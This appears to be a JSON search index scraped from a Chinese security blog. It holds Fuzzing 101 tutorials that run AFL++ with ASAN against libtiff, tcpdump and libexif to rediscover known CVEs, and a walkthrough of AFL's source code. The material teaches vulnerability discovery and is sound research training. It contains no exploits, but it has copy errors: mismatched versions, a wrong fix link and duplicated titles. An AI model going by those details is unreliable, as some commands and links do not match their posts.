文件夹下的测试用例作为本次fuzz的语料。 3. Code Coverage 代码覆盖率是一种软件指标，表达了每行代码被触发的次数。通过使用代码覆盖率，我们可以了解 fuzzer 已经到达了代码的哪些部分，并可视化了 fuzzing 过程。 首先，需要安装 lcov： sudo apt install lcov 然后，我们使用 --coverage选项来重建libTIFF库： rm -r $HOME/Desktop/Fuzz/training/fuzzing_tiff/install cd $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/ make clean CFLAGS=\"--coverage\" LDFLAGS=\"--coverage\" ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/\" --disable-shared make make install 然后使用下面的指令来进行代码覆盖率收集： cd $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/ lcov --zerocounters --directory ./ # 重置计数器 lcov --capture --initial --directory ./ --output-file app.info $HOME/Desktop/Fuzz/training/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff lcov --no-checksum --directory ./ --capture --output-file app2.info # 返回“基线”覆盖数据文件，其中包含每个检测行的零覆盖 最后，生成HTML输出： genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info 一切顺利的话，会生成以下文件： 打开生成的 index.html 会看到如下结果： 4. Fuzzing 重新编译： rm -r $HOME/Desktop/Fuzz/training/fuzzing_tiff/install cd $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/ make clean export LLVM_CONFIG=\"llvm-config-12\" CC=afl-clang-lto ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/\" --disable-shared # 开启AFL_USE_ASAN AFL_USE_ASAN=1 make -j4 AFL_USE_ASAN=1 make install 执行 afl-fuzz : afl-fuzz -m none -i $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/test/images/ -o $HOME/Desktop/Fuzz/training/fuzzing_tiff/out/ -s 123 -- $HOME/Desktop/Fuzz/training/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w @@ ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"3. Crashes 最终跑得的结果如下： ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"4. Triage ASan追踪结果如下： ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"5. Fix 官方的修复地址： https://github.com/the-tcpdump-group/tcpdump/commit/29e5470e6ab84badbc31f4532bb7554a796d9d52 后续将对该漏洞进行深入分析和补丁分析，待完善。 官方的修复地址： https://github.com/the-tcpdump-group/tcpdump/commit/29e5470e6ab84badbc31f4532bb7554a796d9d52 后续将对该漏洞进行深入分析和补丁分析，待完善。 ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 3","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"Fuzzing 101 – 3 本文是Fuzzing101系列第三篇，fuzz的对象为 tcpdump。 ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics TCPdump CVE-2017-13028 4hous ASAN CVE-2017-13028: Out-of-bounds Read vulneratibily. ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"2. Learning Target 什么是 ASAN(Address Sanitizer)，一个运行时内存错误检测工具 如何使用ASAN进行fuzz 使用ASAN对crash进行分类 ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"1. Workflow 确定如何进行TCpdump的fuzz工作 在fuzz时开启ASAN功能 实际的fuzz过程 追踪crash，找到对应的漏洞的poc 修复漏洞 ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先创建待fuzz的 TCPdump 环境，进行编译待用： cd $HOME/Desktop/Fuzz/training/fuzzing_tcpdump # download and uncompress tcpdump-4.9.2.tar.gz wget https://github.com/the-tcpdump-group/tcpdump/archive/refs/tags/tcpdump-4.9.2.tar.gz tar -xzvf tcpdump-4.9.2.tar.gz # download and uncompress libpcap-1.8.1.tar.gz wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.1.tar.gz tar -xzvf libpcap-1.8.1.tar.gz # build and install cd libpcap-libpcap-1.8.1/ ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" make make install # build and install tcpdump cd .. cd tcpdump-tcpdump-4.9.2/ CPPFLAGS=-I$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/include/ LDFLAGS=-L$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/lib/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" make make install # test $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/sbin/tcpdump -h 以上安装不报错的话，可以正常启动 tcpdump ： 2. Seed corpus creation 在 tests 文件夹中有很多的测试样例： 运行样例的命令如下： $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r [.pcap file] # -vvvv 输出极为详细的信息 # -XX 把协议头和包内容都原原本本的显示出来（tcpdump会以16进制和ASCII的形式显示） # -ee 在输出行打印出数据链路层的头部信息，包括源mac和目的mac，以及网络层的协议 # -nn 指定将每个监听到的数据包中的域名转换成IP、端口从应用名称转换成端口号后显示 # -r 指定文件 运行结果大概如下： 3. AddressSanitizer AddressSanitizer(ASAN) 是一个C和C++的内存错误检测工具，2011年由Google的研究员开发。 它包括一个编译器检测模块和一个运行时库，该工具可以发现对堆、栈和全局对象的越界访问、释放后重利用、双重释放和内存泄漏错误。 AddressSanitizer 是开源的，并且从 3.1 版开始与 LLVM 编译器工具链集成。虽然它最初是作为 LLVM 的项目开发的，但它已被移植到 GCC 并包含在 GCC \u003e= 4.8 的版本中 。 更多内容请参考AddressSanitizer。 本文我们主要是为了在fuzz时开启ASAN，所以先删除上面已经编译好的对象文件和可执行文件： rm -r $HOME/fuzzing_tcpdump/install cd $HOME/fuzzing_tcpdump/libpcap-libpcap-1.8.1/ make clean cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/ make clean clean 完成后，在进行make前附加 AFL_USE_ASAN=1 的编译选项： cd $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/libpcap-libpcap-1.8.1/ export LLVM_CONFIG=\"llvm-config-12\" CC=afl-clang-lto ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" AFL_USE_ASAN=1 make AFL_USE_ASAN=1 make install cd $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/ CC=afl-clang-lto CPPFLAGS=-I$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/include/ LDFLAGS=-L$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/lib/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" CC=afl-clang-lto CPPFLAGS=-I$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/include/ LDFLAGS=-L$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/lib/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" AFL_USE_ASAN=1 make AFL_USE_ASAN=1 make install 4. Fuzzing 执行 afl-fuzz : afl-fuzz -m none -i $HOME/Desktop/Fuzz/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/tests/ -o $HOME/Desktop/Fuzz/fuzzing_tcpdump/out/ -s 123 -- $HOME/Desktop/Fuzz/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r @@ 备注：这里指定了 -m none 选项是取消了AFL的内存使用限制，因为在64-bit系统下，ASAN会占用较多的内存。 ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"3. Crashes 最终跑得的结果如下： ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"4. Triage 对使用了ASAN 进行build的程序进行debug是一件十分容易的事情，只要直接将crash文件喂给程序运行即可，然后就可以得到crash的相关信息，包括函数的执行追踪： ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"5. Fix 官方的修复地址： https://github.com/the-tcpdump-group/tcpdump/commit/29e5470e6ab84badbc31f4532bb7554a796d9d52 后续将对该漏洞进行深入分析和补丁分析，待完善。 ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 3","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"Fuzzing 101 – 2 本文是Fuzzing101系列第二篇，fuzz的对象为libexif库。 ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics libexif CVE-2009-3895, CVE-2012-2836 3hous aft-clang-lto, fuzz libraries, Eclipse IDE CVE-2009-3895: heap-based buffer overflow vulnerability. CVE-2012-2836: out-of-bounds read vulnerability. ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"2. Learning Target 如何对使用了外部库的应用进行fuzz 使用 afl-clang-lto 进行fuzz，它比 afl-clang-fast 的速度更快 使用 Eclipse IDE进行动态调试 ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"1. Workflow 寻找使用了 libexif 库的应用接口 创建 exif 样例的种子语料库 使用 afl-clang-lto 编译 libexif 和选择的应用程序 对 libexif 进行fuzz 对 crash 进行分类过滤，确认每个漏洞的 PoC 修复漏洞 ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先创建待fuzz的 libexif 环境，进行编译待用： # download wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz tar -xzvf libexif-0_6_15-release.tar.gz # build and install libexif cd libexif-libexif-0_6_15-release/ sudo apt install autopoint libtool gettext libpopt-dev autoreconf -fvi ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_libexif/install/\" make make install # choosing an interface application wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz tar -xzvf exif-0_6_15-release.tar.gz # build and install exif command-line utility cd .. cd exif-exif-0_6_15-release/ autoreconf -fvi ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/traning/fuzzing_libexif/install/\" PKG_CONFIG_PATH=$HOME/Desktop/Fuzz/traning/fuzzing_libexif/install/lib/pkgconfig make make install 备注：这里的libexif的版本最好选用 0_6_15 版本，14的版本make install会一直报错，而且没有出现过官方issue。为节省时间，更换了版本。 2. Seed corpus creation 创建种子语料库，这里选用的是github上公开的一个exif的样例库：https://github.com/ianare/exif-samples。 # download and unzip cd $HOME/Desktop/Fuzz/training/fuzzing_libexif wget https://github.com/ianare/exif-samples/archive/refs/heads/master.zip unzip master.zip 安装完成后，使用 exif 检测一下样本，可以成功识别即可。 3. aft-clang-lto instrumentation 使用 afl-clang-lto 重新对 libexif 和 exif 进行编译： # recompile libexif with afl-clang-lto rm -r $HOME/Desktop/Fuzz/training/fuzzing_libexif/install cd $HOME/Desktop/Fuzz/training/fuzzing_libexif/libexif-libexif-0_6_15-release/ make clean export LLVM_CONFIG=\"llvm-config-12\" # llvm-config-version at least is 11 CC=afl-clang-lto ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_libexif/install/\" make make install # recompile exif with afl-clang-lto cd $HOME/fuzzing_libexif/exif-exif-0_6_15-release make clean export LLVM_CONFIG=\"llvm-config-12\" CC=afl-clang-lto ./configure --enable-shared=no --prefix=\"$HOME/fuzzing_libexif/install/\" PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig make make install 4. Start fuzz 编译完成后，可以使用afl++在 afl-clang-lto 模式下开始进行fuzz： afl-fuzz -i $HOME/Desktop/Fuzz/training/fuzzing_libexif/exif-samples-master/jpg/ -o $HOME/Desktop/Fuzz/training/fuzzing_libexif/out/ -s 123 -- $HOME/Desktop/Fuzz/training/fuzzing_libexif/install/bin/exif @@ ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"3. Crashes 最终跑得的结果如下（因为自动跑的，所以cycle超了）： ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"4. Debug ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"1. Eclipse setup # install java sudo apt install default-jdk # download and run Eclipse wget https://download.eclipse.org/technology/epp/downloads/release/2021-06/R/eclipse-cpp-2021-06-R-linux-gtk-x86_64.tar.gz tar -zxvf eclipse-cpp-2021-06-R-linux-gtk-x86_64.tar.gz 解压完成后，进入文件夹，运行 eclipse 即可。 导入项目：选择 File -\u003e Import ， 然后选择 C/C++ 里的 Existing code as makefile project 。然后选择 Linux GCC ，并选择代码路径。 调试：选择 run -\u003e Debug Configurations，然后选择exif项目并且选定exif 可执行程序，然后设置 Arguments 中为crash 的绝对路径名，最后点击 Debug 即可。调试过程中，直接 F8 或者 run -\u003e Resume 可以直接来到crash 现场。 2. Eclipse crash debug 最后就是使用Eclipse进行crash的debug了，这个就不做记录了，需要花时间调试每个crash文件。 ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:4:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"AFL二三事系列 note 3","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"本文是AFL系列第四篇，主要介绍AFL的源码分析。 AFL二三事——源码分析 ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:0:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"前言 AFL，全称“American Fuzzy Lop”，是由安全研究员Michal Zalewski开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率（代码执行路径的覆盖情况），以此进行反馈，对输入样本进行调整以提高覆盖率，从而提升发现漏洞的可能性。AFL可以针对有源码和无源码的程序进行模糊测试，其设计思想和实现方案在模糊测试领域具有十分重要的意义。 深入分析AFL源码，对理解AFL的设计理念和其中用到的技巧有着巨大的帮助，对于后期进行定制化Fuzzer开发也具有深刻的指导意义。所以，阅读AFL源码是学习AFL必不可少的一个关键步骤。 （注：需要强调的是，本文的主要目的是协助fuzz爱好者阅读AFL的源码，所以需要在了解AFL基本工作流程和原理的前提下进行阅读，本文并不会在原理侧做过多说明。） 当别人都要快的时候，你要慢下来。 ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:1:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"宏观 首先在宏观上看一下AFL的源码结构： 主要的代码在 afl-fuzz.c 文件中，然后是几个独立模块的实现代码，llvm_mode 和 qemu_mode 的代码量大致相当，所以分析的重点应该还是在AFL的根目录下的几个核心功能的实现上，尤其是 afl-fuzz.c，属于核心中的重点。 各个模块的主要功能和作用的简要说明： 插桩模块 afl-as.h, afl-as.c, afl-gcc.c：普通插桩模式，针对源码插桩，编译器可以使用gcc， clang； llvm_mode：llvm 插桩模式，针对源码插桩，编译器使用clang； qemu_mode：qemu 插桩模式，针对二进制文件插桩。 fuzzer 模块 afl-fuzz.c：fuzzer 实现的核心代码，AFL 的主体。 其他辅助模块 afl-analyze：对测试用例进行分析，通过分析给定的用例，确定是否可以发现用例中有意义的字段； afl-plot：生成测试任务的状态图； afl-tmin：对测试用例进行最小化； afl-cmin：对语料库进行精简操作； afl-showmap：对单个测试用例进行执行路径跟踪； afl-whatsup：各并行例程fuzzing结果统计； afl-gotcpu：查看当前CPU状态。 部分头文件说明 alloc-inl.h：定义带检测功能的内存分配和释放操作； config.h：定义配置信息； debug.h：与提示信息相关的宏定义； hash.h：哈希函数的实现定义； types.h：部分类型及宏的定义。 ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:2:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"一、AFL的插桩——普通插桩 ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:3:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"（一） 、AFL 的 gcc —— afl-gcc.c 1. 概述 afl-gcc 是GCC 或 clang 的一个wrapper（封装），常规的使用方法是在调用 ./configure 时通过 CC 将路径传递给 afl-gcc 或 afl-clang。（对于 C++ 代码，则使用 CXX 并将其指向 afl-g++ / afl-clang++。）afl-clang, afl-clang++， afl-g++ 均为指向 afl-gcc 的一个符号链接。 afl-gcc 的主要作用是实现对于关键节点的代码插桩，属于汇编级，从而记录程序执行路径之类的关键信息，对程序的运行情况进行反馈。 2. 源码 1. 关键变量 在开始函数代码分析前，首先要明确几个关键变量： static u8* as_path; /* Path to the AFL 'as' wrapper，AFL的as的路径 */ static u8** cc_params; /* Parameters passed to the real CC，CC实际使用的编译器参数 */ static u32 cc_par_cnt = 1; /* Param count, including argv0 ，参数计数 */ static u8 be_quiet, /* Quiet mode，静默模式 */ clang_mode; /* Invoked as afl-clang*? ，是否使用afl-clang*模式 */ # 数据类型说明 # typedef uint8_t u8; # typedef uint16_t u16; # typedef uint32_t u32; 2. main函数 main 函数全部逻辑如下： 其中主要有如下三个函数的调用： find_as(argv[0]) ：查找使用的汇编器 edit_params(argc, argv)：处理传入的编译参数，将确定好的参数放入 cc_params[] 数组 调用 execvp(cc_params[0], (cahr**)cc_params) 执行 afl-gcc 这里添加了部分代码打印出传入的参数 arg[0] - arg[7] ，其中一部分是我们指定的参数，另外一部分是自动添加的编译选项。 3. find_as 函数 函数的核心作用：寻找 afl-as 函数内部大概的流程如下（软件自动生成，控制流程图存在误差，但关键逻辑没有问题）： 首先检查环境变量 AFL_PATH ，如果存在直接赋值给 afl_path ，然后检查 afl_path/as 文件是否可以访问，如果可以，as_path = afl_path。 如果不存在环境变量 AFL_PATH ，检查 argv[0] （如“/Users/v4ler1an/AFL/afl-gcc”）中是否存在 “/” ，如果存在则取最后“/” 前面的字符串作为 dir，然后检查 dir/afl-as 是否可以访问，如果可以，将 as_path = dir 。 以上两种方式都失败，抛出异常。 4. edit_params 函数 核心作用：将 argv 拷贝到 u8 **cc_params ，然后进行相应的处理。 函数内部的大概流程如下： 调用 ch_alloc() 为 cc_params 分配大小为 (argc + 128) * 8 的内存（u8的类型为1byte无符号整数） 检查 argv[0] 中是否存在/，如果不存在则 name = argv[0]，如果存在则一直找到最后一个/，并将其后面的字符串赋值给 name 对比 name和固定字符串afl-clang： 若相同，设置clang_mode = 1，设置环境变量CLANG_ENV_VAR为1 对比name和固定字符串afl-clang++:： 若相同，则获取环境变量AFL_CXX的值，如果存在，则将该值赋值给cc_params[0]，否则将afl-clang++赋值给cc_params[0]。这里的cc_params为保存编译参数的数组； 若不相同，则获取环境变量AFL_CC的值，如果存在，则将该值赋值给cc_params[0]，否则将afl-clang赋值给cc_params[0]。 如果不相同，并且是Apple平台，会进入 #ifdef __APPLE__。在Apple平台下，开始对 name 进行对比，并通过 cc_params[0] = getenv(\"\") 对cc_params[0]进行赋值；如果是非Apple平台，对比 name 和 固定字符串afl-g++（此处忽略对Java环境的处理过程）： 若相同，则获取环境变量AFL_CXX的值，如果存在，则将该值赋值给cc_params[0]，否则将g++赋值给cc_params[0]； 若不相同，则获取环境变量AFL_CC的值，如果存在，则将该值赋值给cc_params[0]，否则将gcc赋值给cc_params[0]。 进入 while 循环，遍历从argv[1]开始的argv参数： 如果扫描到 -B ，-B选项用于设置编译器的搜索路径，直接跳过。（因为在这之前已经处理过as_path了）； 如果扫描到 -integrated-as，跳过； 如果扫描到 -pipe，跳过； 如果扫描到 -fsanitize=address 和 -fsanitize=memory 告诉 gcc 检查内存访问的错误，比如数组越界之类，设置 asan_set = 1； 如果扫描到 FORTIFY_SOURCE ，设置 fortify_set = 1 。FORTIFY_SOURCE 主要进行缓冲区溢出问题的检查，检查的常见函数有memcpy, mempcpy, memmove, memset, strcpy, stpcpy, strncpy, strcat, strncat, sprintf, vsprintf, snprintf, gets 等； 对 cc_params 进行赋值：cc_params[cc_par_cnt++] = cur; 跳出 while 循环，设置其他参数： 取出前面计算出的 as_path ，设置 -B as_path ； 如果为 clang_mode ，则设置-no-integrated-as； 3. 如果存在环境变量 AFL_HARDEN，则设置-fstack-protector-all。且如果没有设置 fortify_set ，追加 -D_FORTIFY_SOURCE=2 ； sanitizer相关，通过多个if进行判断： 如果 asan_set 在前面被设置为1，则设置环境变量 AFL_USE_ASAN 为1； 如果 asan_set 不为1且，存在 AFL_USE_ASAN 环境变量，则设置 -U_FORTIFY_SOURCE -fsanitize=address； 如果不存在 AFL_USE_ASAN 环境变量，但存在 AFL_USE_MSAN 环境变量，则设置-fsanitize=memory（不能同时指定AFL_USE_ASAN或者AFL_USE_MSAN，也不能同时指定 AFL_USE_MSAN 和 AFL_HARDEN，因为这样运行时速度过慢； 如果不存在 AFL_DONT_OPTIMIZE 环境变量，则设置-g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1； 如果存在 AFL_NO_BUILTIN 环境变量，则表示允许进行优化，设置-fno-builtin-strcmp -fno-builtin-strncmp -fno-builtin-strcasecmp -fno-builtin-strncasecmp -fno-builtin-memcmp -fno-builtin-strstr -fno-builtin-strcasestr。 最后补充cc_params[cc_par_cnt] = NULL;，cc_params 参数数组编辑完成。 ###（二）、AFL的插桩 —— afl-as.c 1. 概述 afl-gcc 是 GNU as 的一个wrapper（封装），唯一目的是预处理由 GCC/clang 生成的汇编文件，并注入包含在 afl-as.h 中的插桩代码。 使用 afl-gcc / afl-clang 编译程序时，工具链会自动调用它。该wapper的目标并不是为了实现向 .s 或 asm 代码块中插入手写的代码。 experiment/clang_asm_normalize/ 中可以找到可能允许 clang 用户进行手动插入自定义代码的解决方案，GCC并不能实现该功能。 2. 源码 1. 关键变量 在开始函数代码分析前，首先要明确几个关键变量： static u8** as_params; /* Parameters passed to the real 'as'，传递给as的参数 */ static u8* input_file; /* Originally specified input file ，输入文件 */ static u8* modified_file; /* Instrumented file for the real 'as'，as进行插桩处理的文件 */ static u8 be_quiet, /* Quiet mode (no stderr output) ，静默模式，没有标准输出 */ clang_mode","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:3:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"二、AFL 的插桩 —— llvm_mode ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:4:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"（一）、LLVM 前置知识 LLVM 主要为了解决编译时多种多样的前端和后端导致编译环境复杂、苛刻的问题，其核心为设计了一个称为 LLVM IR 的中间表示，并以库的形式提供一些列接口，以提供诸如操作 IR 、生成目标平台代码等等后端的功能。其整体架构如下所示： 不同的前端和后端使用统一的中间代码LLVM InterMediate Representation(LLVM IR)，其结果就是如果需要支持一门新的编程语言，只需要实现一个新的前端；如果需要支持一款新的硬件设备，只需要实现一个新的后端；优化阶段为通用阶段，针对统一的 LLVM IR ，与新的编程语言和硬件设备无关。 GCC 的前后端耦合在一起，没有进行分离，所以GCC为了支持一门新的编程语言或一个新的硬件设备，需要重新开发前端到后端的完整过程。 Clang 是 LLVM 项目的一个子项目，它是 LLVM 架构下的 C/C++/Objective-C 的编译器，是 LLVM 前端的一部分。相较于GCC，具备编译速度快、占用内存少、模块化设计、诊断信息可读性强、设计清晰简单等优点。 最终从源码到机器码的流程如下（以 Clang 做编译器为例）： （LLVM Pass 是一些中间过程处理 IR 的可以用户自定义的内容，可以用来遍历、修改 IR 以达到插桩、优化、静态分析等目的。） 代码首先由编译器前端clang处理后得到中间代码IR，然后经过各 LLVM Pass 进行优化和转换，最终交给编译器后端生成机器码。 ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:4:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"（二）、 AFL的afl-clang-fast 1. 概述 AFL的 llvm_mode 可以实现编译器级别的插桩，可以替代 afl-gcc 或 afl-clang 使用的比较“粗暴”的汇编级别的重写的方法，且具备如下几个优势： 编译器可以进行很多优化以提升效率； 可以实现CPU无关，可以在非 x86 架构上进行fuzz； 可以更好地处理多线程目标。 在AFL的 llvm_mode 文件夹下包含3个文件： afl-clang-fast.c ， afl-llvm-pass.so.cc， afl-llvm-rt.o.c。 afl-llvm-rt.o.c 文件主要是重写了 afl-as.h 文件中的 main_payload 部分，方便调用； afl-llvm-pass.so.cc 文件主要是当通过 afl-clang-fast 调用 clang 时，这个pass被插入到 LLVM 中，告诉编译器添加与 ``afl-as.h` 中大致等效的代码； afl-clang-fast.c 文件本质上是 clang 的 wrapper，最终调用的还是 clang 。但是与 afl-gcc 一样，会进行一些参数处理。 llvm_mode 的插桩思路就是通过编写pass来实现信息记录，对每个基本块都插入探针，具体代码在 afl-llvm-pass.so.cc 文件中，初始化和forkserver操作通过链接完成。 2. 源码 1. afl-clang-fast.c 1. main 函数 main 函数的全部逻辑如下： 主要是对 find_obj(), edit_params(), execvp() 函数的调用， 